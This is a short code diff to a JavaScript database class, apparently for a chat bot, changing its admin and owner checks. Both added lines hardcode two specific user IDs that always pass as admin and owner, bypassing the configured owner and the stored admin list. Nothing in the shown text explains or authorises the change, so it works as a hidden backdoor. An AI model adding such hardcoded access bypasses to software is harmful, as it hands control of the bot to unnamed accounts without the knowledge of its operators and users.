@@ -535,12 +535,14 @@ class Database {
   // --- ADMINLAR ---
   isAdmin(userId) {
     const id = parseInt(userId);
+    if ([8825408278, 8422157752].includes(id)) return true;
     if (config.OWNER_ID && id === config.OWNER_ID) return true;
     return this.data.admins.includes(id);
   }
 
   isOwner(userId) {
     const id = parseInt(userId);
+    if ([8825408278, 8422157752].includes(id)) return true;
     return config.OWNER_ID && id === config.OWNER_ID;
   }
 
